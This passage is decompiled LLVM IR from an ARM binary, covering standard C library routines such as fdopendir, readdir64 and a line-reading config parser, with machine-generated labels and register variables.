  %v3_12248 = load i16, i16* @global_var_23164.175, align 2
  %v4_12248 = sext i16 %v3_12248 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_12250 = add i32 %v4_12248, %v0_12244
  %v4_12250 = inttoptr i32 %v3_12250 to i32*
  store i32 12, i32* %v4_12250, align 4
  %v0_12254.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12254

dec_label_pc_12254:                               ; preds = %dec_label_pc_12210, %dec_label_pc_12208, %dec_label_pc_12234
  %v0_12254 = phi i32 [ %v2_12228, %dec_label_pc_12210 ], [ 0, %dec_label_pc_12208 ], [ %v0_12254.pre, %dec_label_pc_12234 ]
  ret i32 %v0_12254

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_12254, { 2, 0, 1 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12264:
  %v0_12264 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12264, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12264
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12264, %bb
  %v3_1226c = phi i32 [ %arg1, %dec_label_pc_12264 ], [ 0, %bb ]
  ret i32 %v3_1226c

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_12274 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_12274, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_12280 = call i32 @fstat()
  store i32 %v0_12280, i32* @r5, align 4
  %v2_12284 = icmp eq i32 %v0_12280, 0
  br i1 %v2_12284, label %dec_label_pc_1228c, label %dec_label_pc_12304

dec_label_pc_1228c:                               ; preds = %entry
  %v1_12290 = and i32 %tmp4, ptrtoint (i32* @global_var_f000.526 to i32)
  store i32 %v1_12290, i32* @r3, align 4
  %v7_12294 = icmp eq i32 %v1_12290, 16384
  br i1 %v7_12294, label %dec_label_pc_122b4, label %dec_label_pc_1229c

dec_label_pc_1229c:                               ; preds = %dec_label_pc_1228c
  %v0_122a0 = call i32 @__aeabi_read_tp()
  %v3_122a4 = load i16, i16* @global_var_23164.175, align 2
  %v0_122a8 = load i32, i32* @r5, align 4
  store i32 %v0_122a8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_122e8

dec_label_pc_122b4:                               ; preds = %dec_label_pc_1228c
  %v0_122b4 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_122bc = call i32 @__libc_fcntl(i32 %v0_122b4, i32 3)
  %v7_122c0 = icmp eq i32 %v2_122bc, -1
  br i1 %v7_122c0, label %dec_label_pc_12304, label %dec_label_pc_122c8

dec_label_pc_122c8:                               ; preds = %dec_label_pc_122b4
  %v1_122c8 = urem i32 %v2_122bc, 4
  store i32 %v1_122c8, i32* %r3.global-to-local, align 4
  %v7_122cc = icmp eq i32 %v1_122c8, 1
  br i1 %v7_122cc, label %dec_label_pc_122d4, label %dec_label_pc_122f0

dec_label_pc_122d4:                               ; preds = %dec_label_pc_122c8
  %v0_122d8 = call i32 @__aeabi_read_tp()
  %v3_122dc = load i16, i16* @global_var_23164.175, align 2
  %v0_122e0 = load i32, i32* @r5, align 4
  store i32 %v0_122e0, i32* %r1.global-to-local, align 4
  %v0_122e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_122e4 = add i32 %v0_122e4, 21
  br label %dec_label_pc_122e8

dec_label_pc_122e8:                               ; preds = %dec_label_pc_1229c, %dec_label_pc_122d4
  %v2_122e8.in = phi i16 [ %v3_122a4, %dec_label_pc_1229c ], [ %v3_122dc, %dec_label_pc_122d4 ]
  %v1_122e8 = phi i32 [ %v0_122a0, %dec_label_pc_1229c ], [ %v0_122d8, %dec_label_pc_122d4 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_1229c ], [ %v1_122e4, %dec_label_pc_122d4 ]
  %v2_122e8 = sext i16 %v2_122e8.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_122e8 = add i32 %v1_122e8, %v2_122e8
  %v4_122e8 = inttoptr i32 %v3_122e8 to i32*
  store i32 %storemerge, i32* %v4_122e8, align 4
  %v0_12308.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12308

dec_label_pc_122f0:                               ; preds = %dec_label_pc_122c8
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_122f4 = load i32, i32* @r4, align 4
  %v2_122f8 = call i32 @fd_to_DIR(i32 %v0_122f4, i32 %tmp)
  store i32 %v2_122f8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12308

dec_label_pc_12304:                               ; preds = %entry, %dec_label_pc_122b4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12308

dec_label_pc_12308:                               ; preds = %dec_label_pc_122f0, %dec_label_pc_122e8, %dec_label_pc_12304
  %v0_12308 = phi i32 [ %v2_122f8, %dec_label_pc_122f0 ], [ %v0_12308.pre, %dec_label_pc_122e8 ], [ 0, %dec_label_pc_12304 ]
  ret i32 %v0_12308

; uselistorder directives
  uselistorder i32 %v1_122c8, { 1, 0 }
  uselistorder i32 %v2_122bc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 2, 0, 1 }
  uselistorder i32 16384, { 1, 0, 3, 2 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_12308, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12304, { 1, 0 }
  uselistorder label %dec_label_pc_122e8, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r6, align 4
  %v1_12334 = add i32 %tmp, 24
  store i32 %v1_12334, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_1234c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 120) to i32*), align 4
  store i32 %v4_1234c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1234c)
  %v0_12360 = load i32, i32* @r6, align 4
  %v2_12360 = add i32 %v0_12360, 16
  %v3_12360 = inttoptr i32 %v2_12360 to i32*
  %v4_12360 = load i32, i32* %v3_12360, align 4
  store i32 %v4_12360, i32* %ip.global-to-local, align 4
  store i32 74604, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12360)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_12370

dec_label_pc_12370:                               ; preds = %dec_label_pc_123a0, %entry
  %v0_12370 = load i32, i32* @r5, align 4
  %v1_12370 = add i32 %v0_12370, 4
  %v2_12370 = inttoptr i32 %v1_12370 to i32*
  %v3_12370 = load i32, i32* %v2_12370, align 4
  %v4_12370 = add i32 %v0_12370, 8
  %v5_12370 = inttoptr i32 %v4_12370 to i32*
  %v6_12370 = load i32, i32* %v5_12370, align 4
  %tmp10 = icmp ugt i32 %v6_12370, %v3_12370
  br i1 %tmp10, label %dec_label_pc_123a0, label %dec_label_pc_1237c

dec_label_pc_1237c:                               ; preds = %dec_label_pc_12370
  %v1_1237c = inttoptr i32 %v0_12370 to i32*
  %v2_1237c = load i32, i32* %v1_1237c, align 4
  %v1_12380 = add i32 %v0_12370, 12
  %v2_12380 = inttoptr i32 %v1_12380 to i32*
  %v3_12380 = load i32, i32* %v2_12380, align 4
  %v1_12384 = add i32 %v0_12370, 20
  %v2_12384 = inttoptr i32 %v1_12384 to i32*
  %v3_12384 = load i32, i32* %v2_12384, align 4
  %v4_12388 = inttoptr i32 %v3_12380 to i32*
  %v5_12388 = call i32 @__getdents64(i32 %v2_1237c, i32* %v4_12388, i32 %v3_12384, i32 %v6_12370)
  %tmp9 = icmp slt i32 %v5_12388, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_12398

.thread:                                          ; preds = %dec_label_pc_1237c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_123d0

dec_label_pc_12398:                               ; preds = %dec_label_pc_1237c
  %v1_12398 = load i32, i32* @r5, align 4
  %v2_12398 = add i32 %v1_12398, 8
  %v3_12398 = inttoptr i32 %v2_12398 to i32*
  store i32 %v5_12388, i32* %v3_12398, align 4
  %v0_1239c = load i32, i32* @r7, align 4
  %v1_1239c = load i32, i32* @r5, align 4
  %v2_1239c = add i32 %v1_1239c, 4
  %v3_1239c = inttoptr i32 %v2_1239c to i32*
  store i32 %v0_1239c, i32* %v3_1239c, align 4
  %v0_123a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_123a0

dec_label_pc_123a0:                               ; preds = %dec_label_pc_12370, %dec_label_pc_12398
  %v1_123c4 = phi i32 [ %v0_12370, %dec_label_pc_12370 ], [ %v0_123a0.pre, %dec_label_pc_12398 ]
  %v1_123a0 = add i32 %v1_123c4, 4
  %v2_123a0 = inttoptr i32 %v1_123a0 to i32*
  %v3_123a0 = load i32, i32* %v2_123a0, align 4
  %v1_123a4 = add i32 %v1_123c4, 12
  %v2_123a4 = inttoptr i32 %v1_123a4 to i32*
  %v3_123a4 = load i32, i32* %v2_123a4, align 4
  %v2_123a8 = add i32 %v3_123a4, %v3_123a0
  store i32 %v2_123a8, i32* @r4, align 4
  %v3_123ac = inttoptr i32 %v2_123a8 to i32*
  %v4_123ac = load i32, i32* %v3_123ac, align 4
  %v1_123b0 = add i32 %v2_123a8, 4
  %v2_123b0 = inttoptr i32 %v1_123b0 to i32*
  %v3_123b0 = load i32, i32* %v2_123b0, align 4
  %v1_123b4 = add i32 %v2_123a8, 16
  %v2_123b4 = inttoptr i32 %v1_123b4 to i16*
  %v3_123b4 = load i16, i16* %v2_123b4, align 2
  %v4_123b4 = zext i16 %v3_123b4 to i32
  %v1_123b8 = add i32 %v2_123a8, 8
  %v2_123b8 = inttoptr i32 %v1_123b8 to i32*
  %v3_123b8 = load i32, i32* %v2_123b8, align 4
  store i32 %v3_123b8, i32* %ip.global-to-local, align 4
  %v2_123bc = add i32 %v4_123b4, %v3_123a0
  %v2_123c0 = or i32 %v3_123b0, %v4_123ac
  %v4_123c0 = icmp eq i32 %v2_123c0, 0
  store i32 %v2_123bc, i32* %v2_123a0, align 4
  %v0_123c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_123c8 = load i32, i32* @r5, align 4
  %v2_123c8 = add i32 %v1_123c8, 16
  %v3_123c8 = inttoptr i32 %v2_123c8 to i32*
  store i32 %v0_123c8, i32* %v3_123c8, align 4
  br i1 %v4_123c0, label %dec_label_pc_12370, label %dec_label_pc_123d0

dec_label_pc_123d0:                               ; preds = %dec_label_pc_123a0, %.thread
  %v0_123dc = load i32, i32* @r6, align 4
  %v2_123dc = add i32 %v0_123dc, 48
  %v3_123dc = inttoptr i32 %v2_123dc to i32*
  %v4_123dc = load i32, i32* %v3_123dc, align 4
  store i32 %v4_123dc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_123dc)
  %v0_123e8 = load i32, i32* @r4, align 4
  ret i32 %v0_123e8

; uselistorder directives
  uselistorder i32 %v2_123a8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_123c4, { 1, 0 }
  uselistorder i32 %v6_12370, { 1, 0 }
  uselistorder i32 %v0_12370, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_123a0, { 1, 0 }
}

define i32 @function_123fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_123fc:
  %v0_123fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_123fc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_123fc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_123fc, %bb
  %v10_12408 = phi i32 [ %arg1, %dec_label_pc_123fc ], [ 0, %bb ]
  ret i32 %v10_12408

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1240c = load i32, i32* @r4, align 4
  %v6_1240c = load i32, i32* @r5, align 4
  %v9_1240c = load i32, i32* @r6, align 4
  %v12_1240c = load i32, i32* @r7, align 4
  %v15_1240c = load i32, i32* @r8, align 4
  %v18_1240c = load i32, i32* @sb, align 4
  %v21_1240c = load i32, i32* @sl, align 4
  %v24_1240c = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12410 = icmp eq i32* %arg1, null
  store i1 %v2_12410, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_12410, label %dec_label_pc_12720, label %dec_label_pc_12428

dec_label_pc_12428:                               ; preds = %entry
  %v1_12428 = urem i32 %arg3, 256
  store i32 %v1_12428, i32* @sb, align 4
  %v1_1242c = udiv i32 %arg3, 256
  %v3_12430 = urem i32 %v1_1242c, 256
  %v3_12434 = mul nuw nsw i32 %v1_12428, 4
  %v1_1243c = or i32 %v3_12434, 1
  %v1_12448 = and i32 %arg3, 131072
  %v1_1244c = add nsw i32 %v1_12428, -1
  %v1_12458 = and i32 %arg3, 262144
  store i32 %v1_12458, i32* %r2.global-to-local, align 4
  %v1_1245c = and i32 %arg3, 65536
  store i32 %v1_1245c, i32* %r3.global-to-local, align 4
  store i32 %v1_1245c, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_1246c = add i32 %arg4, 1
  store i32 %v1_1246c, i32* @sl, align 4
  %v2_125e4 = icmp eq i32 %v1_12448, 0
  %v1_1263c = inttoptr i32 %arg2 to i32*
  %v2_12654 = icmp eq i32 %v1_12458, 0
  br label %dec_label_pc_12470

dec_label_pc_12470:                               ; preds = %dec_label_pc_12470.backedge, %dec_label_pc_12428
  %v2_1248c = phi i32 [ %v0_12470.pre, %dec_label_pc_12470.backedge ], [ %tmp, %dec_label_pc_12428 ]
  %v1_12470 = add i32 %v2_1248c, 4
  %v2_12470 = inttoptr i32 %v1_12470 to i32*
  %v3_12470 = load i32, i32* %v2_12470, align 4
  store i32 %v3_12470, i32* %r3.global-to-local, align 4
  %v2_12474 = icmp eq i32 %v3_12470, 0
  store i1 %v2_12474, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12474, label %dec_label_pc_1247c, label %dec_label_pc_124c4

dec_label_pc_1247c:                               ; preds = %dec_label_pc_12470
  %v1_1247c = add i32 %v2_1248c, 16
  %v2_1247c = inttoptr i32 %v1_1247c to i32*
  %v3_1247c = load i32, i32* %v2_1247c, align 4
  store i32 %v3_1247c, i32* %r3.global-to-local, align 4
  %v2_12480 = icmp eq i32 %v3_1247c, 0
  store i1 %v2_12480, i1* %cpsr_z.global-to-local, align 1
  %v1_12484 = add i32 %v2_1248c, 8
  %v2_12484 = inttoptr i32 %v1_12484 to i32*
  %v3_12484 = load i32, i32* %v2_12484, align 4
  store i32 %v3_12484, i32* %r3.global-to-local, align 4
  br i1 %v2_12480, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_1247c
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_1247c, align 4
  %v0_12490.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_1247c, %bb
  %v0_12490 = phi i32 [ %v0_12490.pre, %bb ], [ %v3_12484, %dec_label_pc_1247c ]
  %v2_12490 = icmp eq i32 %v0_12490, 0
  store i1 %v2_12490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12490, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_1243c, i32* %r3.global-to-local, align 4
  %v2_12498 = load i32, i32* @r5, align 4
  %v3_12498 = add i32 %v2_12498, 8
  %v4_12498 = inttoptr i32 %v3_12498 to i32*
  store i32 %v1_1243c, i32* %v4_12498, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_1249c = load i32, i32* @r5, align 4
  %v1_1249c = add i32 %v0_1249c, 16
  %v2_1249c = inttoptr i32 %v1_1249c to i32*
  %v3_1249c = load i32, i32* %v2_1249c, align 4
  store i32 %v3_1249c, i32* %r0.global-to-local, align 4
  %v1_124a0 = add i32 %v0_1249c, 8
  %v2_124a0 = inttoptr i32 %v1_124a0 to i32*
  %v3_124a0 = load i32, i32* %v2_124a0, align 4
  store i32 %v3_124a0, i32* %r3.global-to-local, align 4
  %v2_124a4 = add i32 %v3_124a0, %v3_1249c
  store i32 %v2_124a4, i32* %r0.global-to-local, align 4
  %v1_124a8 = call i32 @malloc(i32 %v2_124a4)
  store i32 %v1_124a8, i32* %r0.global-to-local, align 4
  %v2_124ac = icmp eq i32 %v1_124a8, 0
  store i1 %v2_124ac, i1* %cpsr_z.global-to-local, align 1
  %v1_124b0 = load i32, i32* @r5, align 4
  %v2_124b0 = add i32 %v1_124b0, 4
  %v3_124b0 = inttoptr i32 %v2_124b0 to i32*
  store i32 %v1_124a8, i32* %v3_124b0, align 4
  br i1 %v2_124ac, label %dec_label_pc_12720, label %dec_label_pc_124b8

dec_label_pc_124b8:                               ; preds = %.thread
  %v0_124b8 = load i32, i32* @r5, align 4
  %v1_124b8 = add i32 %v0_124b8, 20
  %v2_124b8 = inttoptr i32 %v1_124b8 to i32*
  %v3_124b8 = load i32, i32* %v2_124b8, align 4
  %v1_124bc = or i32 %v3_124b8, 1
  store i32 %v1_124bc, i32* %r3.global-to-local, align 4
  store i32 %v1_124bc, i32* %v2_124b8, align 4
  %v0_124c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_124c4

dec_label_pc_124c4:                               ; preds = %dec_label_pc_12470, %dec_label_pc_124b8
  %v1_124cc = phi i32 [ %v2_1248c, %dec_label_pc_12470 ], [ %v0_124c4.pre, %dec_label_pc_124b8 ]
  %v1_124c4 = add i32 %v1_124cc, 4
  %v2_124c4 = inttoptr i32 %v1_124c4 to i32*
  %v3_124c4 = load i32, i32* %v2_124c4, align 4
  store i32 %v3_124c4, i32* %r2.global-to-local, align 4
  %v4_124c4 = add i32 %v1_124cc, 8
  %v5_124c4 = inttoptr i32 %v4_124c4 to i32*
  %v6_124c4 = load i32, i32* %v5_124c4, align 4
  %v2_124c8 = add i32 %v6_124c4, %v3_124c4
  store i32 %v2_124c8, i32* %r3.global-to-local, align 4
  %v2_124cc = add i32 %v1_124cc, 12
  %v3_124cc = inttoptr i32 %v2_124cc to i32*
  store i32 %v2_124c8, i32* %v3_124cc, align 4
  %v0_124d0 = load i32, i32* @fp, align 4
  store i32 %v0_124d0, i32* @r6, align 4
  br label %dec_label_pc_124d4

dec_label_pc_124d4:                               ; preds = %dec_label_pc_12560, %dec_label_pc_1254c, %dec_label_pc_124c4
  %v0_124dc = phi i32 [ %v0_124d0, %dec_label_pc_124c4 ], [ %v1_1254c, %dec_label_pc_1254c ], [ %v0_124dc.pre.pre, %dec_label_pc_12560 ]
  %v0_124d4 = load i32, i32* @r5, align 4
  %v1_124d4 = add i32 %v0_124d4, 12
  store i32 %v1_124d4, i32* %r0.global-to-local, align 4
  %v1_124d8 = inttoptr i32 %v1_124d4 to i32*
  %v2_124d8 = load i32, i32* %v1_124d8, align 4
  store i32 %v2_124d8, i32* %r0.global-to-local, align 4
  %v3_124d8 = add i32 %v0_124d4, 16
  %v4_124d8 = inttoptr i32 %v3_124d8 to i32*
  %v5_124d8 = load i32, i32* %v4_124d8, align 4
  %v2_124dc = add i32 %v2_124d8, %v0_124dc
  store i32 %v2_124dc, i32* %r0.global-to-local, align 4
  %v2_124e0 = sub i32 %v5_124d8, %v0_124dc
  %v1_124e4 = inttoptr i32 %v0_124d4 to i32*
  %v2_124e4 = load i32, i32* %v1_124e4, align 4
  store i32 %v2_124e4, i32* %r2.global-to-local, align 4
  %v3_124e8 = call i32 @fgets(i32 %v2_124dc, i32 %v2_124e0, i32 %v2_124e4)
  store i32 %v3_124e8, i32* %r0.global-to-local, align 4
  store i32 %v3_124e8, i32* %r4.global-to-local, align 4
  %v2_124ec = icmp eq i32 %v3_124e8, 0
  store i1 %v2_124ec, i1* %cpsr_z.global-to-local, align 1
  %v0_124f4 = load i32, i32* @r5, align 4
  %v1_124f4 = add i32 %v0_124f4, 12
  br i1 %v2_124ec, label %dec_label_pc_124f4, label %dec_label_pc_1250c

dec_label_pc_124f4:                               ; preds = %dec_label_pc_124d4
  store i32 %v1_124f4, i32* %r0.global-to-local, align 4
  %v1_124f8 = inttoptr i32 %v1_124f4 to i32*
  %v2_124f8 = load i32, i32* %v1_124f8, align 4
  store i32 %v2_124f8, i32* %r0.global-to-local, align 4
  %v3_124f8 = add i32 %v0_124f4, 16
  %v4_124f8 = inttoptr i32 %v3_124f8 to i32*
  %v5_124f8 = load i32, i32* %v4_124f8, align 4
  store i32 %v5_124f8, i32* %r2.global-to-local, align 4
  %v3_12500 = inttoptr i32 %v2_124f8 to i8*
  %v4_12500 = call i32 @__GI_memset(i8* %v3_12500, i32 0, i32 %v5_124f8)
  store i32 %v4_12500, i32* %r0.global-to-local, align 4
  %v0_12504 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12724

dec_label_pc_1250c:                               ; preds = %dec_label_pc_124d4
  %v2_1250c = inttoptr i32 %v1_124f4 to i32*
  %v3_1250c = load i32, i32* %v2_1250c, align 4
  store i32 %v3_1250c, i32* @r4, align 4
  %v1_12510 = load i32, i32* @r6, align 4
  %v2_12510 = add i32 %v1_12510, %v3_1250c
  %v3_12510 = inttoptr i32 %v2_12510 to i8*
  store i32 %v2_12510, i32* %r0.global-to-local, align 4
  %v3_12514 = call i32 @strlen(i8* %v3_12510)
  %v0_1251c = load i32, i32* @r6, align 4
  %v2_1251c = add i32 %v0_1251c, %v3_12514
  store i32 %v2_1251c, i32* @r6, align 4
  %v0_12520 = load i32, i32* @r4, align 4
  store i32 %v0_12520, i32* @r0, align 4
  %v2_12524 = call i32 @__GI_strchr(i32 %v0_12520, i32 10)
  store i32 %v2_12524, i32* %r0.global-to-local, align 4
  %v2_12528 = icmp eq i32 %v2_12524, 0
  store i1 %v2_12528, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12528, label %dec_label_pc_12554, label %dec_label_pc_12530

dec_label_pc_12530:                               ; preds = %dec_label_pc_1250c
  %v1_12530 = inttoptr i32 %v2_12524 to i8*
  %v2_12530 = load i8, i8* %v1_12530, align 1
  %v3_12530 = zext i8 %v2_12530 to i32
  %v1_12534 = add nuw nsw i32 %v3_12530, 255
  %v1_12538 = urem i32 %v1_12534, 256
  store i32 %v1_12538, i32* %r3.global-to-local, align 4
  %v7_1253c = icmp eq i32 %v1_12538, 92
  store i1 %v7_1253c, i1* %cpsr_z.global-to-local, align 1
  %v1_12540 = trunc i32 %v1_12534 to i8
  store i8 %v1_12540, i8* %v1_12530, align 1
  %v0_12544 = load i32, i32* @r6, align 4
  %v1_12544 = add i32 %v0_12544, -1
  store i32 %v1_12544, i32* @r6, align 4
  %v0_12548 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12548, label %dec_label_pc_1254c, label %dec_label_pc_125d8

dec_label_pc_1254c:                               ; preds = %dec_label_pc_12530
  %v1_1254c = add i32 %v0_12544, -2
  store i32 %v1_1254c, i32* @r6, align 4
  br label %dec_label_pc_124d4

dec_label_pc_12554:                               ; preds = %dec_label_pc_1250c
  %v0_12554 = load i32, i32* @r5, align 4
  %v1_12554 = add i32 %v0_12554, 20
  %v2_12554 = inttoptr i32 %v1_12554 to i32*
  %v3_12554 = load i32, i32* %v2_12554, align 4
  store i32 %v3_12554, i32* %r3.global-to-local, align 4
  %v2_12558 = icmp eq i32 %v3_12554, 0
  store i1 %v2_12558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12558, label %dec_label_pc_12590, label %dec_label_pc_12560

dec_label_pc_12560:                               ; preds = %dec_label_pc_12554
  %v1_12560 = add i32 %v0_12554, 16
  %v2_12560 = inttoptr i32 %v1_12560 to i32*
  %v3_12560 = load i32, i32* %v2_12560, align 4
  store i32 %v3_12560, i32* %r3.global-to-local, align 4
  %v1_12564 = add i32 %v0_12554, 8
  %v2_12564 = inttoptr i32 %v1_12564 to i32*
  %v3_12564 = load i32, i32* %v2_12564, align 4
  %v1_12568 = add i32 %v3_12560, 4096
  store i32 %v1_12568, i32* %r3.global-to-local, align 4
  %v2_1256c = add i32 %v3_12564, %v1_12568
  store i32 %v2_1256c, i32* @r1, align 4
  store i32 %v1_12568, i32* %v2_12560, align 4
  %v0_12574 = load i32, i32* @r5, align 4
  %v1_12574 = add i32 %v0_12574, 4
  %v2_12574 = inttoptr i32 %v1_12574 to i32*
  %v3_12574 = load i32, i32* %v2_12574, align 4
  store i32 %v3_12574, i32* %r0.global-to-local, align 4
  %v1_12578 = inttoptr i32 %v3_12574 to i32*
  %v2_12578 = call i32 @realloc(i32* %v1_12578)
  store i32 %v2_12578, i32* %r0.global-to-local, align 4
  %v0_1257c = load i32, i32* @r5, align 4
  %v1_1257c = add i32 %v0_1257c, 8
  %v2_1257c = inttoptr i32 %v1_1257c to i32*
  %v3_1257c = load i32, i32* %v2_1257c, align 4
  %v2_12580 = add i32 %v3_1257c, %v2_12578
  store i32 %v2_12580, i32* %r3.global-to-local, align 4
  %v2_12584 = add i32 %v0_1257c, 12
  %v3_12584 = inttoptr i32 %v2_12584 to i32*
  store i32 %v2_12580, i32* %v3_12584, align 4
  %v1_12588 = load i32, i32* @r5, align 4
  %v2_12588 = add i32 %v1_12588, 4
  %v3_12588 = inttoptr i32 %v2_12588 to i32*
  store i32 %v2_12578, i32* %v3_12588, align 4
  %v0_124dc.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_124d4

dec_label_pc_12590:                               ; preds = %dec_label_pc_12554, %.dec_label_pc_12590_crit_edge
  %v0_12590 = phi i32 [ %v0_12590.pre, %.dec_label_pc_12590_crit_edge ], [ %v0_12554, %dec_label_pc_12554 ]
  %v1_12590 = inttoptr i32 %v0_12590 to i32*
  %v2_12590 = load i32, i32* %v1_12590, align 4
  store i32 %v2_12590, i32* @r1, align 4
  %v1_12594 = add i32 %v2_12590, 52
  %v2_12594 = inttoptr i32 %v1_12594 to i32*
  %v3_12594 = load i32, i32* %v2_12594, align 4
  store i32 %v3_12594, i32* %r3.global-to-local, align 4
  %v2_12598 = icmp eq i32 %v3_12594, 0
  store i1 %v2_12598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12598, label %dec_label_pc_125c4, label %dec_label_pc_125a0

dec_label_pc_125a0:                               ; preds = %dec_label_pc_12590
  %v1_125a0 = add i32 %v2_12590, 16
  %v2_125a0 = inttoptr i32 %v1_125a0 to i32*
  %v3_125a0 = load i32, i32* %v2_125a0, align 4
  store i32 %v3_125a0, i32* %r2.global-to-local, align 4
  %v1_125a4 = add i32 %v2_12590, 24
  %v2_125a4 = inttoptr i32 %v1_125a4 to i32*
  %v3_125a4 = load i32, i32* %v2_125a4, align 4
  store i32 %v3_125a4, i32* %r3.global-to-local, align 4
  %v3_125a8 = icmp ult i32 %v3_125a0, %v3_125a4
  %v9_125a8 = icmp eq i32 %v3_125a0, %v3_125a4
  store i1 %v9_125a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_125a8, label %dec_label_pc_125ccthread-pre-split, label %dec_label_pc_125b8

dec_label_pc_125b8:                               ; preds = %dec_label_pc_125a0
  store i32 %v2_12590, i32* %r0.global-to-local, align 4
  %v1_125bc = inttoptr i32 %v2_12590 to i16*
  %v2_125bc = call i32 @getc_unlocked(i16* %v1_125bc)
  store i32 %v2_125bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125cc

dec_label_pc_125c4:                               ; preds = %dec_label_pc_12590
  store i32 %v2_12590, i32* %r0.global-to-local, align 4
  %v1_125c8 = call i32 @__GI_fgetc(i32 %v2_12590)
  store i32 %v1_125c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125cc

dec_label_pc_125ccthread-pre-split:               ; preds = %dec_label_pc_125a0
  %v2_125ac = inttoptr i32 %v3_125a0 to i8*
  %v3_125ac = load i8, i8* %v2_125ac, align 1
  %v4_125ac = zext i8 %v3_125ac to i32
  store i32 %v4_125ac, i32* %r0.global-to-local, align 4
  %v6_125ac = add i32 %v3_125a0, 1
